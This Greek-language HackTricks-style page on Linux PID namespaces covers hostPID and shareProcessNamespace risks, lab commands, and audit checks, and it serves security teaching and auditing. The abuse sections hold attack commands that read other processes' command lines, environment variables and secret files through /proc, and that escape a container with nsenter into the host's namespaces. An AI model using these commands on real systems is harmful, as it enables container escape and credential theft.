# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Το PID namespace ελέγχει τον τρόπο αρίθμησης των processes και το ποια processes είναι ορατά. Γι' αυτό ένα container μπορεί να έχει το δικό του PID 1, παρόλο που δεν είναι πραγματικό μηχάνημα. Μέσα στο namespace, το workload βλέπει αυτό που φαίνεται σαν ένα τοπικό process tree. Έξω από το namespace, το host εξακολουθεί να βλέπει τα πραγματικά host PIDs και ολόκληρο το process landscape.<sup>[[3]](#references)</sup>

Από άποψη security, το PID namespace έχει σημασία επειδή η ορατότητα των processes είναι πολύτιμη. Μόλις ένα workload μπορέσει να δει host processes, ενδέχεται να μπορεί να παρατηρήσει service names, command-line arguments, secrets που έχουν περαστεί ως process arguments, state που προέρχεται από το environment μέσω του `/proc` και πιθανούς στόχους για namespace-entry. Αν μπορεί να κάνει περισσότερα από το να βλέπει απλώς αυτά τα processes, για παράδειγμα να στέλνει signals ή να χρησιμοποιεί ptrace υπό τις κατάλληλες συνθήκες, το πρόβλημα γίνεται πολύ σοβαρότερο.

## Λειτουργία

Ένα νέο PID namespace ξεκινά με τη δική του εσωτερική αρίθμηση processes. Το πρώτο process που δημιουργείται μέσα σε αυτό γίνεται PID 1 από την οπτική γωνία του namespace, πράγμα που σημαίνει επίσης ότι αποκτά ειδική init-like συμπεριφορά για orphaned children και signal behavior. Αυτό εξηγεί πολλές ιδιομορφίες των containers σχετικά με init processes, zombie reaping και τον λόγο για τον οποίο μερικές φορές χρησιμοποιούνται tiny init wrappers σε containers.<sup>[[3]](#references)</sup>

Τα PID namespaces σχηματίζουν μια ιεραρχία. Ένα process σε ancestor namespace μπορεί να προσπελάσει descendants χρησιμοποιώντας το PID που έχει εκχωρηθεί σε εκείνο το ancestor, αλλά ένα descendant δεν μπορεί να προσπελάσει tasks που υπάρχουν μόνο σε ancestor μέσω συνηθισμένων PID-based syscalls ή να χρησιμοποιήσει `setns()` προς τα πάνω, σε ancestor PID namespace. Ένα procfs που ανήκει στον ancestor και έχει εκτεθεί σκόπιμα στο descendant μπορεί ακόμη να leakάρει την process view του ancestor. Επίσης, η είσοδος σε ένα PID namespace με `setns()` αλλάζει το namespace για **μελλοντικά children**, όχι για τον ίδιο τον caller· γι' αυτό τα tools κάνουν fork μετά την είσοδο. Ένα procfs mount διατηρεί την PID view του process που το έκανε mount, γι' αυτό η δημιουργία ενός νέου procfs μετά το `unshare(CLONE_NEWPID)` είναι σημαντική για το security και όχι απλώς θέμα εμφάνισης.<sup>[[3]](#references)</sup>

Το σημαντικό security lesson είναι ότι ένα process μπορεί να φαίνεται isolated επειδή βλέπει μόνο το δικό του PID tree, αλλά αυτή η isolation μπορεί να αφαιρεθεί σκόπιμα. Το Docker το εκθέτει μέσω του `--pid=host`, ενώ το Kubernetes το κάνει μέσω του `hostPID: true`. Μόλις το container ενταχθεί στο host PID namespace, το workload βλέπει απευθείας τα host processes και πολλά μεταγενέστερα attack paths γίνονται πολύ πιο ρεαλιστικά.

## Εργαστήριο

Για να δημιουργήσετε χειροκίνητα ένα PID namespace:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Το `shell` βλέπει πλέον μια ιδιωτική προβολή διεργασιών. Το flag `--mount-proc` είναι σημαντικό, επειδή προσαρτά ένα instance του procfs που αντιστοιχεί στο νέο PID namespace, κάνοντας τη λίστα διεργασιών συνεκτική από το εσωτερικό.<sup>[[3]](#references)</sup>

Για σύγκριση της συμπεριφοράς των containers:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Η διαφορά είναι άμεση και εύκολα κατανοητή, γι' αυτό αποτελεί καλό πρώτο lab για τους αναγνώστες.

## Χρήση στο Runtime

Τα κανονικά containers στα Docker, Podman, containerd και CRI-O αποκτούν το δικό τους PID namespace. Τα Kubernetes containers έχουν κανονικά ξεχωριστές προβολές PID· το `shareProcessNamespace: true` δημιουργεί σκόπιμα μία κοινή προβολή για ολόκληρο το Pod.<sup>[[4]](#references)</sup> Αντίθετα, το `hostPID: true` επιλέγει το PID namespace του node. Τα περιβάλλοντα LXC/Incus βασίζονται στο ίδιο kernel primitive, αν και οι περιπτώσεις χρήσης system-container μπορεί να εκθέτουν πιο σύνθετα process trees και να ενθαρρύνουν περισσότερα debugging shortcuts.

Ο ίδιος κανόνας ισχύει παντού: αν το runtime επέλεξε να μην απομονώσει το PID namespace, αυτό αποτελεί σκόπιμη μείωση του ορίου του container.

## Λανθασμένες ρυθμίσεις

Η canonical λανθασμένη ρύθμιση είναι η κοινή χρήση του host PID. Οι ομάδες συχνά τη δικαιολογούν για debugging, monitoring ή ευκολία στη διαχείριση services, αλλά θα πρέπει πάντα να αντιμετωπίζεται ως ουσιαστική εξαίρεση ασφαλείας. Ακόμη και αν το container δεν διαθέτει άμεσο write primitive πάνω στις host processes, η ορατότητα από μόνη της μπορεί να αποκαλύψει πολλά για το σύστημα. Μόλις προστεθούν capabilities όπως το `CAP_SYS_PTRACE` ή χρήσιμη πρόσβαση στο procfs, ο κίνδυνος αυξάνεται σημαντικά.

Ένα ακόμη λάθος είναι η υπόθεση ότι, επειδή το workload δεν μπορεί από προεπιλογή να κάνει kill ή ptrace σε host processes, η κοινή χρήση του host PID είναι επομένως ακίνδυνη. Αυτό το συμπέρασμα αγνοεί την αξία του enumeration, τη διαθεσιμότητα targets για namespace entry και τον τρόπο με τον οποίο η ορατότητα PID συνδυάζεται με άλλους αποδυναμωμένους ελέγχους.

### Κοινή χρήση processes σε ολόκληρο το Kubernetes Pod

Το `shareProcessNamespace: true` διαφέρει από το `hostPID`: εκθέτει τα processes των **άλλων containers στο ίδιο Pod**, όχι τα processes του node. Ένα compromised sidecar ή debug container μπορεί έτσι να κάνει enumeration στα command lines και στα environment data των sibling containers, με την επιφύλαξη των ελέγχων πρόσβασης του procfs, να στέλνει signals όταν το επιτρέπουν τα credentials και να περιηγείται στο filesystem ενός sibling μέσω του `/proc/<pid>/root`. Το Kubernetes προειδοποιεί ρητά ότι τα secrets της γραμμής εντολών/του environment και τα filesystems των containers προστατεύονται πλέον μόνο από τα ισχύοντα Unix permissions.<sup>[[4]](#references)</sup>

Χρήσιμος έλεγχος από την πλευρά του cluster:
```bash
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
[.metadata.namespace,.metadata.name,
(.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```
Από ένα παραβιασμένο container σε ένα Pod-wide PID namespace, ελέγξτε πρώτα την πραγματική πρόσβαση αντί να υποθέτετε ότι η ορατότητα ισοδυναμεί με αναγνωσιμότητα:<sup>[[4]](#references)</sup>
```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```
## Κατάχρηση

Εάν το host PID namespace είναι κοινόχρηστο, ένας attacker μπορεί να επιθεωρήσει τις διεργασίες του host, να συλλέξει ορίσματα διεργασιών, να εντοπίσει ενδιαφέρουσες υπηρεσίες, να βρει υποψήφια PIDs για `nsenter` ή να συνδυάσει την ορατότητα διεργασιών με privilege που σχετίζεται με το `ptrace`, ώστε να παρέμβει σε workloads του host ή γειτονικών workloads. Σε ορισμένες περιπτώσεις, αρκεί απλώς να δει τη σωστή διεργασία μακράς διάρκειας για να αναδιαμορφώσει το υπόλοιπο σχέδιο επίθεσης.

Το πρώτο πρακτικό βήμα είναι πάντα να επιβεβαιωθεί ότι οι διεργασίες του host είναι πράγματι ορατές:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Μόλις τα PIDs του host είναι ορατά, τα ορίσματα των διεργασιών και οι στόχοι εισόδου σε namespace συχνά γίνονται η πιο χρήσιμη πηγή πληροφοριών:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Εάν το `nsenter` είναι διαθέσιμο και υπάρχουν επαρκή δικαιώματα, ελέγξτε αν μια ορατή διεργασία του host μπορεί να χρησιμοποιηθεί ως γέφυρα namespace:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Ακόμη και όταν η είσοδος είναι αποκλεισμένη, το host PID sharing είναι ήδη χρήσιμο, επειδή αποκαλύπτει τη διάταξη των υπηρεσιών, τα runtime components και υποψήφιες privileged processes για στόχευση στη συνέχεια. Η ορατότητα των PID από μόνη της **δεν** παρέχει άδεια για αποστολή σημάτων, tracing, ανάγνωση ευαίσθητων καταχωρίσεων `/proc/<pid>`, ή είσοδο στα άλλα namespaces του target· τα credentials, το dumpability, τα capabilities στο user namespace που κατέχει το namespace του target, η πολιτική Yama/LSM και το seccomp εξακολουθούν να έχουν σημασία.<sup>[[3]](#references)</sup> Δείτε το [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) για παραδείγματα process-injection.

Η ορατότητα των host PID καθιστά επίσης πιο ρεαλιστικό το file-descriptor abuse. Αν μια privileged host process ή ένα neighboring workload έχει ανοιχτό ένα ευαίσθητο αρχείο ή socket, ο attacker μπορεί να είναι σε θέση να επιθεωρήσει το `/proc/<pid>/fd/` και να αποκτήσει πρόσβαση στο underlying object, ανάλογα με τους ptrace-style ελέγχους, το ownership, τις mount options του procfs, τον τύπο του object και το target service model. Το να βλέπει κανείς απλώς ένα FD symlink δεν σημαίνει ότι μπορεί να το ανοίξει, και ένα socket δεν μπορεί να γίνει duplicate απλώς ανοίγοντας το `/proc/<pid>/fd/N` symlink του. Για το ξεχωριστό primitive `pidfd_getfd()` και τους authorization checks του, δείτε το [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Οι παρακάτω εντολές είναι χρήσιμες, επειδή δείχνουν αν το `hidepid=1` ή το `hidepid=2` μειώνει την ορατότητα μεταξύ διεργασιών και αν είναι בכלל ορατοί προφανώς ενδιαφέροντες descriptors, όπως ανοιχτά secret files, logs ή Unix sockets.

### Πλήρες παράδειγμα: host PID + `nsenter`

Η κοινή χρήση των host PID γίνεται άμεσο host escape όταν η διεργασία έχει επίσης αρκετά privileges ώστε να συνδεθεί στα host namespaces:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Εάν η εντολή ολοκληρωθεί επιτυχώς, η διεργασία του container εκτελείται πλέον στα mount, UTS, network, IPC και PID namespaces του host. Ο αντίκτυπος είναι άμεσο host compromise.

Ακόμη και όταν το `nsenter` απουσιάζει, το ίδιο αποτέλεσμα μπορεί να επιτευχθεί μέσω του binary του host, εάν το filesystem του host είναι mounted:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Πρόσφατες σημειώσεις Runtime

Ορισμένες επιθέσεις που σχετίζονται με το PID namespace δεν είναι παραδοσιακές λανθασμένες ρυθμίσεις `hostPID: true`, αλλά bugs στην υλοποίηση του runtime σχετικά με τον τρόπο εφαρμογής των προστασιών του procfs κατά τη ρύθμιση του container.

#### Race του `maskedPaths` προς το procfs του host

Σε ευάλωτες εκδόσεις του `runc`, attackers που μπορούν να ελέγξουν το container image ή το workload του `runc exec` μπορούν να εκμεταλλευτούν τη φάση masking, αντικαθιστώντας το `/dev/null` στην πλευρά του container με ένα symlink προς μια ευαίσθητη διαδρομή procfs, όπως το `/proc/sys/kernel/core_pattern`. Αν το race πετύχει, το bind mount του masked path μπορεί να καταλήξει σε λάθος target και να εκθέσει global procfs knobs του host στο νέο container.<sup>[[1]](#references)</sup>

Χρήσιμη εντολή ελέγχου:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Αυτό είναι σημαντικό επειδή ο τελικός αντίκτυπος μπορεί να είναι ίδιος με την άμεση έκθεση του procfs: εγγράψιμα `core_pattern` ή `sysrq-trigger`, ακολουθούμενα από εκτέλεση κώδικα στο host ή denial of service. Οι ειδικές σελίδες για τα [masked paths](../masked-paths.md) και τα [sensitive host mounts](../../sensitive-host-mounts.md) καλύπτουν τη γενική επιφάνεια επίθεσης του procfs χωρίς να την επαναλαμβάνουν εδώ.

#### Namespace injection με `insject`

Εργαλεία namespace injection όπως το `insject` δείχνουν ότι η αλληλεπίδραση με ένα PID namespace δεν απαιτεί πάντα την εκ των προτέρων είσοδο στο target namespace πριν από τη δημιουργία της διεργασίας. Ένα helper μπορεί να συνδεθεί αργότερα, να χρησιμοποιήσει το `setns()` και να εκτελεστεί διατηρώντας την ορατότητα στον χώρο PID του target:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Αυτό το είδος τεχνικής είναι κυρίως σημαντικό για advanced debugging, offensive tooling και post-exploitation workflows, όπου το namespace context πρέπει να συνδεθεί αφού το runtime έχει ήδη αρχικοποιήσει το workload.

### Σχετικά μοτίβα κατάχρησης FD

Αξίζει να αναφερθούν ρητά δύο μοτίβα όταν τα host PIDs είναι ορατά. Πρώτον, μια privileged διεργασία μπορεί να διατηρεί ένα sensitive file descriptor ανοιχτό μετά το `execve()`, επειδή δεν είχε επισημανθεί με `O_CLOEXEC`. Δεύτερον, οι services μπορούν να μεταβιβάζουν file descriptors μέσω Unix sockets με χρήση του `SCM_RIGHTS`. Και στις δύο περιπτώσεις, το ενδιαφέρον αντικείμενο δεν είναι πλέον το pathname, αλλά το ήδη ανοιχτό handle που μπορεί να κληρονομηθεί ή να ληφθεί από μια διεργασία με χαμηλότερα privileges.

Αυτό είναι σημαντικό στο container work, επειδή το handle μπορεί να δείχνει στο `docker.sock`, σε ένα privileged log, σε ένα host secret file ή σε άλλο high-value object, ακόμη και όταν το ίδιο το path δεν είναι άμεσα προσβάσιμο από το filesystem του container.

## Έλεγχοι

Σκοπός αυτών των εντολών είναι να προσδιοριστεί αν η διεργασία έχει private PID view ή αν μπορεί ήδη να απαριθμήσει ένα πολύ ευρύτερο process landscape.
```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```
Τι είναι ενδιαφέρον εδώ:<sup>[[3]](#references)</sup>

- Αν η λίστα διεργασιών περιέχει προφανείς υπηρεσίες του host, πιθανότατα το host PID sharing είναι ήδη ενεργό.
- Το να βλέπετε μόνο ένα μικρό, τοπικό στο container δέντρο είναι η φυσιολογική βασική κατάσταση· το να βλέπετε `systemd`, `dockerd` ή άσχετους daemons δεν είναι.
- Το `NSpid` μπορεί να αποκαλύψει την αντιστοίχιση PID σε nested namespaces. Η αριστερότερη τιμή είναι σχετική με το PID namespace που σχετίζεται με το procfs mount, και ακολουθούν τιμές για διαδοχικά nested namespaces.
- Το `readlink /proc/self/ns/pid` από μόνο του δεν μπορεί να αποδείξει το `hostPID`: ένα isolated container έχει επίσης ένα έγκυρο PID-namespace inode. Συσχετίστε το με τη λίστα διεργασιών, το procfs mount, τη runtime configuration και ένα host-side namespace inode, όταν είναι διαθέσιμο.
- Μόλις γίνουν ορατά τα host PIDs, ακόμη και οι πληροφορίες διεργασιών μόνο για ανάγνωση γίνονται χρήσιμες για reconnaissance.

Αν ανακαλύψετε ένα container που εκτελείται με host PID sharing, μην το αντιμετωπίσετε ως απλώς αισθητική διαφορά. Πρόκειται για σημαντική αλλαγή στο τι μπορεί να παρατηρεί και δυνητικά να επηρεάζει το workload.



## References

- [1] [Συμβουλευτική ασφάλειας του runc: διαφυγή από container μέσω κατάχρησης του "masked path" λόγω race conditions στο mount (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Κυκλοφορία εργαλείου – insject: Ένας Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Βιβλίο Linux man-pages 6.19](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Κοινή χρήση Process Namespace μεταξύ Containers σε ένα Pod](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
{{#include ../../../../../banners/hacktricks-training.md}}
